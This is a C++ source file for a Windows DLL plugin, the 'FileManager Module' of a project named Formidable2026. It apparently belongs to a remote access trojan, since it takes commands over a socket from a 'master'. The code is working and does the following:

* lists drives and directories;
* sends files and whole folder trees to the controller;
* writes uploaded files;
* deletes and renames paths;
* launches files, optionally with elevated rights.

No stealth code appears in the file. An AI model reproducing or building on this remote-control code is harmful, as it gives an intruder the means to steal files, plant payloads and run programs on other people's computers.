/**
 * Formidable2026 - FileManager Module (DLL)
 * Encoding: UTF-8 BOM
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <sstream>
#include <vector>
#include <fstream>
#include <shellapi.h>
#include "../../Common/Config.h"
#include "../../Common/Utils.h"

using namespace Formidable;

// 全局变量用于处理文件上传
std::string g_uploadPath;
std::ofstream g_uploadFile;

void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;
    
    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = len;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }
    
    send(s, buffer.data(), (int)buffer.size(), 0);
}

std::string ListFiles(const std::string& path) {
    std::stringstream ss;
    WIN32_FIND_DATAW findData;
    std::wstring wPath = UTF8ToWide(path);
    std::wstring searchPath = wPath;
    if (searchPath.back() != L'*' && searchPath.back() != L'?') {
        if (searchPath.back() != L'\\') searchPath += L"\\";
        searchPath += L"*";
    }
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return WideToUTF8(L"无法访问目录: ") + path;
    
    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
        
        bool isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
        ss << (isDir ? "[DIR]" : "[FILE]") << "|" << WideToUTF8(findData.cFileName) << "|";
        
        ULARGE_INTEGER fileSize;
        fileSize.LowPart = findData.nFileSizeLow;
        fileSize.HighPart = findData.nFileSizeHigh;
        ss << fileSize.QuadPart << "|";
        
        FILETIME ft = findData.ftLastWriteTime;
        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);
        ss << st.wYear << "-" << st.wMonth << "-" << st.wDay << " " << st.wHour << ":" << st.wMinute << "\n";
        
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
    return ss.str();
}

void DownloadFile(SOCKET s, const std::string& path) {
    std::wstring wPath = UTF8ToWide(path);
    std::ifstream file(wPath, std::ios::binary);
    if (!file.is_open()) {
        std::string msg = "Cannot open file for reading";
        SendResponse(s, CMD_FILE_DOWNLOAD, msg.c_str(), (int)msg.size());
        return;
    }

    char buffer[8192];
    while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
        SendResponse(s, CMD_FILE_DATA, buffer, (int)file.gcount());
    }
    file.close();
    SendResponse(s, CMD_FILE_DOWNLOAD, "FINISH", 6);
}

void DownloadDir(SOCKET s, const std::string& path) {
    std::wstring wPath = UTF8ToWide(path);
    std::wstring searchPath = wPath + L"\\*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
        
        std::string fileName = WideToUTF8(findData.cFileName);
        std::string fullPath = path + "\\" + fileName;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Tell master to create local directory
            std::string cmd = "MKDIR|" + fullPath;
            SendResponse(s, CMD_FILE_DOWNLOAD_DIR, cmd.c_str(), (int)cmd.size());
            DownloadDir(s, fullPath);
        } else {
            // Tell master to start downloading file
            std::string cmd = "FILE|" + fullPath;
            SendResponse(s, CMD_FILE_DOWNLOAD_DIR, cmd.c_str(), (int)cmd.size());
            DownloadFile(s, fullPath);
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
}

void UploadFile(const std::string& path, const void* data, int len, bool append) {
    std::wstring wPath = UTF8ToWide(path);
    std::ofstream file(wPath, std::ios::binary | (append ? std::ios::app : std::ios::trunc));
    if (file.is_open()) {
        file.write((const char*)data, len);
        file.close();
    }
}

std::string ListDrives() {
    std::stringstream ss;
    wchar_t drives[256];
    DWORD len = GetLogicalDriveStringsW(sizeof(drives)/sizeof(wchar_t), drives);
    if (len == 0) return WideToUTF8(L"无法获取磁盘列表");
    
    wchar_t* p = drives;
    while (*p) {
        UINT type = GetDriveTypeW(p);
        std::string sType;
        switch (type) {
        case DRIVE_FIXED: sType = WideToUTF8(L"本地磁盘"); break;
        case DRIVE_REMOVABLE: sType = WideToUTF8(L"可移动磁盘"); break;
        case DRIVE_REMOTE: sType = WideToUTF8(L"网络驱动器"); break;
        case DRIVE_CDROM: sType = WideToUTF8(L"CD-ROM"); break;
        case DRIVE_RAMDISK: sType = WideToUTF8(L"RAM 磁盘"); break;
        default: sType = WideToUTF8(L"未知"); break;
        }
        ss << WideToUTF8(p) << "|" << sType << "\n";
        p += wcslen(p) + 1;
    }
    return ss.str();
}

bool DeleteFileOrDir(const std::string& path) {
    std::wstring wPath = UTF8ToWide(path);
    DWORD attr = GetFileAttributesW(wPath.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) return false;
    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        std::wstring searchPath = wPath;
        if (searchPath.back() != L'\\') searchPath += L"\\";
        searchPath += L"*";
        
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
                
                std::wstring subPath = wPath;
                if (subPath.back() != L'\\') subPath += L"\\";
                subPath += findData.cFileName;
                
                if (!DeleteFileOrDir(WideToUTF8(subPath))) {
                    FindClose(hFind);
                    return false;
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
        return RemoveDirectoryW(wPath.c_str());
    } else {
        return DeleteFileW(wPath.c_str());
    }
}

bool RenameFileOrDir(const std::string& oldPath, const std::string& newPath) {
    std::wstring wOld = UTF8ToWide(oldPath);
    std::wstring wNew = UTF8ToWide(newPath);
    if (MoveFileW(wOld.c_str(), wNew.c_str())) return true;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (MoveFileExW(wOld.c_str(), wNew.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) return true;
    }
    return false;
}

bool RunFile(const std::string& path, bool admin) {
    std::wstring wPath = UTF8ToWide(path);
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = admin ? L"runas" : L"open";
    sei.lpFile = wPath.c_str();
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    return ShellExecuteExW(&sei);
}

// DLL 导出函数
extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    if (pkg->cmd == CMD_FILE_LIST) {
        std::string path = pkg->data;
        std::string result = ListFiles(path);
        SendResponse(s, CMD_FILE_LIST, result.c_str(), (int)result.size());
    } else if (pkg->cmd == CMD_DRIVE_LIST) {
        std::string list = ListDrives();
        SendResponse(s, CMD_DRIVE_LIST, list.c_str(), (int)list.size());
    } else if (pkg->cmd == CMD_FILE_DOWNLOAD) {
        DownloadFile(s, pkg->data);
    } else if (pkg->cmd == CMD_FILE_DOWNLOAD_DIR) {
        DownloadDir(s, pkg->data);
    } else if (pkg->cmd == CMD_FILE_UPLOAD) {
        if (pkg->arg2 == 0) {
            g_uploadPath = pkg->data;
            if (g_uploadFile.is_open()) g_uploadFile.close();
            g_uploadFile.open(g_uploadPath, std::ios::binary | std::ios::trunc);
            if (g_uploadFile.is_open()) {
                SendResponse(s, CMD_FILE_UPLOAD, "READY", 5);
            } else {
                SendResponse(s, CMD_FILE_UPLOAD, "ERROR", 5);
            }
        } else {
            if (g_uploadFile.is_open()) g_uploadFile.close();
            SendResponse(s, CMD_FILE_UPLOAD, "FINISH", 6);
        }
    } else if (pkg->cmd == CMD_FILE_DATA) {
        if (g_uploadFile.is_open()) {
            g_uploadFile.write(pkg->data, pkg->arg1);
        }
    } else if (pkg->cmd == CMD_FILE_DELETE) {
        bool ok = DeleteFileOrDir(pkg->data);
        SendResponse(s, CMD_FILE_DELETE, ok ? "SUCCESS" : "FAILED", ok ? 7 : 6);
    } else if (pkg->cmd == CMD_FILE_RENAME) {
        std::string data = pkg->data;
        size_t pos = data.find('|');
        if (pos != std::string::npos) {
            std::string oldPath = data.substr(0, pos);
            std::string newPath = data.substr(pos + 1);
            bool ok = RenameFileOrDir(oldPath, newPath);
            SendResponse(s, CMD_FILE_RENAME, ok ? "SUCCESS" : "FAILED", ok ? 7 : 6);
        }
    } else if (pkg->cmd == CMD_FILE_RUN) {
        bool admin = (pkg->arg1 == 1);
        bool ok = RunFile(pkg->data, admin);
        SendResponse(s, CMD_FILE_RUN, ok ? "SUCCESS" : "FAILED", ok ? 7 : 6);
    } else if (pkg->cmd == CMD_FILE_MKDIR) {
        std::wstring wPath = UTF8ToWide(pkg->data);
        bool ok = CreateDirectoryW(wPath.c_str(), NULL);
        SendResponse(s, CMD_FILE_MKDIR, ok ? "SUCCESS" : "FAILED", ok ? 7 : 6);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
